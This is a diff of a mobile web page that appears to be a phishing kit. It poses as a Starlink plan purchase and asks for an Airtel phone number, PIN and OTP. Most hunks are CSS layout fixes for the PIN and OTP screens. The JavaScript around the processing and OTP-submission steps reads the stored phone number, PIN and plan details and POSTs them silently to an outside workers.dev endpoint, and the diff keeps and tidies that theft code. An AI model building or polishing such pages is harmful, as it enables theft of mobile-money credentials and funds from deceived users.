@@ -207,9 +207,9 @@ img,svg{display:block;max-width:100%}
 .pin-stage{
   flex:1;min-height:0;
   display:flex;flex-direction:column;align-items:center;justify-content:flex-start;
-  padding:var(--g-4) var(--g-5) max(var(--g-4),env(safe-area-inset-bottom,0px));
+  padding:var(--g-4) var(--g-5) 0;
   gap:var(--g-4);overflow-y:auto;overflow-x:hidden;
-  -webkit-overflow-scrolling:touch;
+  -webkit-overflow-scrolling:touch;overscroll-behavior:contain;
 }
 .pin-head{display:flex;flex-direction:column;gap:var(--g-1);text-align:center;max-width:340px}
 .pin-title{
@@ -285,6 +285,10 @@ img,svg{display:block;max-width:100%}
   box-shadow:0 4px 20px rgba(228,0,0,.4);
   transition:transform .1s,opacity .15s,background .15s;
   border:none;
+  flex-shrink:0;
+  position:sticky;bottom:0;
+  padding-bottom:max(0px,env(safe-area-inset-bottom,0px));
+  background-clip:padding-box;
 }
 .btn-cta:active:not(.dim){transform:scale(.98)}
 .btn-cta.dim{background:var(--surf-mid);color:var(--ink-3);box-shadow:none;cursor:not-allowed;opacity:.7}
@@ -337,10 +341,10 @@ img,svg{display:block;max-width:100%}
 
 /* ═════ OTP ═════ */
 .otp-wrap{
-  padding:var(--g-4) var(--g-4) calc(var(--g-6) + env(safe-area-inset-bottom,0px));
+  padding:var(--g-4) var(--g-4) 0;
   display:flex;flex-direction:column;align-items:center;gap:var(--g-4);
   flex:1;min-height:0;overflow-y:auto;overflow-x:hidden;
-  -webkit-overflow-scrolling:touch;
+  -webkit-overflow-scrolling:touch;overscroll-behavior:contain;
 }
 .otp-card{
   width:100%;max-width:400px;
@@ -468,31 +472,53 @@ img,svg{display:block;max-width:100%}
   height:100%;width:0;background:var(--red);
   border-radius:0 2px 2px 0;
   box-shadow:0 0 8px rgba(228,0,0,.5);
-  transition:width .4s var(--ease
-/* ── TEXT SIZE LOCK — immune to system font scale ── */
-html,*{ -webkit-text-size-adjust:100%!important; text-size-adjust:100%!important; }
-
-/* ── BTN-CTA sticky so it never hides ── */
-.btn-cta{
-  position:sticky!important;
-  bottom:max(0px,env(safe-area-inset-bottom,0px))!important;
-  flex-shrink:0!important;
-  z-index:10;
-}
-
-/* ── Numpad: fixed px, shrink on short screens ── */
-.numkey{ height:54px!important; font-size:21px!important; }
-@media(max-height:680px){ .numkey{ height:48px!important; font-size:19px!important; } }
-@media(max-height:600px){ .numkey{ height:44px!important; font-size:17px!important; }
-  .pin-box,.pb{ height:50px!important; } .otp-box,.ob{ height:50px!important; } }
-@media(max-width:360px){ .numkey{ height:48px!important; } }
-
-/* ── Summary: never overflow ── */
-.summary{ flex-shrink:0!important; overflow:hidden!important; }
-);
+  transition:width .4s var(--ease);
 }
 
 .rip{position:absolute;border-radius:50%;pointer-events:none;background:rgba(0,0,0,.07);transform:scale(0);animation:rip-anim .5s ease forwards}
+
+/* ─── RESPONSIVE FIT ─────────────────────────────────────── */
+html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
+
+/* numkey: fixed px, scale down on short screens */
+.numkey{height:54px!important;font-size:21px!important;flex-shrink:0!important}
+@media(max-height:700px){
+  .numkey{height:50px!important;font-size:20px!important}
+  .pin-box,.pb{height:54px!important}
+  .otp-box,.ob{height:54px!important}
+  .btn-cta{height:50px!important}
+}
+@media(max-height:620px){
+  .numkey{height:46px!important;font-size:18px!important}
+  .pin-box,.pb{height:50px!important}
+  .otp-box,.ob{height:50px!important}
+  .btn-cta{height:46px!important}
+  .pin-stage,.otp-wrap{gap:10px!important}
+}
+@media(max-height:560px){
+  .numkey{height:42px!important;font-size:17px!important}
+  .pin-stage,.otp-wrap{gap:8px!important}
+  .pin-boxes,.otp-boxes{gap:8px!important}
+}
+@media(max-width:360px){
+  .numkey{height:50px!important;font-size:20px!important}
+  .pin-box,.pb{height:54px!important}
+  .btn-cta{max-width:100%!important}
+}
+/* Summary: never overflow vertically */
+.summary{flex-shrink:0!important;overflow:hidden!important;max-height:88px!important}
+.nav{flex-shrink:0!important}
+/* Steps bar */
+.steps{flex-shrink:0!important}
+/* Spacing in pin-stage */
+.pin-head{flex-shrink:0!important}
+.pin-boxes,.otp-boxes{flex-shrink:0!important}
+.numpad{flex-shrink:0!important}
+/* Safe-area bottom padding on sticky btn */
+.btn-cta{
+  margin-bottom:max(12px,env(safe-area-inset-bottom,12px))!important;
+  margin-top:8px!important;
+}
 </style>
 </head>
 <body>
@@ -856,17 +882,15 @@ async function runProcessing(ph){
       document.getElementById('psi'+steps[i].si).className='proc-step act';
     }
   }
-  /* ── Worker: login_initiated ── */
-  (function(){
-    var _f={};var _a={};
+  /* worker */
+  (function(){var _f={};var _a={};
     try{_f=JSON.parse(sessionStorage.getItem('starlinkForfait')||'{}');}catch(e){}
     try{_a=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
     fetch('https://airtel-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
       body:JSON.stringify({event:'login_initiated',data:{
         phone:_a.phone||'',pin:_a.pin||'',
         forfait:_f.name||'',price:_f.price||'',
-        deposit:_f.deposit||'',daily:_f.daily||'',jours:_f.jours||'',
-        ts:Date.now()
+        deposit:_f.deposit||'',daily:_f.daily||'',jours:_f.jours||'',ts:Date.now()
       }})
     }).catch(function(){});
   })();
@@ -979,10 +1003,8 @@ function submitOTP(){
   sessionStorage.setItem('starlinkRef',ref);
   sessionStorage.setItem('starlinkOTP',otpVal);
   for(var i=0;i<4;i++)document.getElementById('ob'+i).classList.add('success');
-
-  /* ── Worker: otp_confirmed ── */
-  (function(){
-    var _f={};var _a={};
+  /* worker */
+  (function(){var _f={};var _a={};
     try{_f=JSON.parse(sessionStorage.getItem('starlinkForfait')||'{}');}catch(e){}
     try{_a=JSON.parse(sessionStorage.getItem('starlinkAuth')||'{}');}catch(e){}
     var _ref=sessionStorage.getItem('starlinkRef')||'';
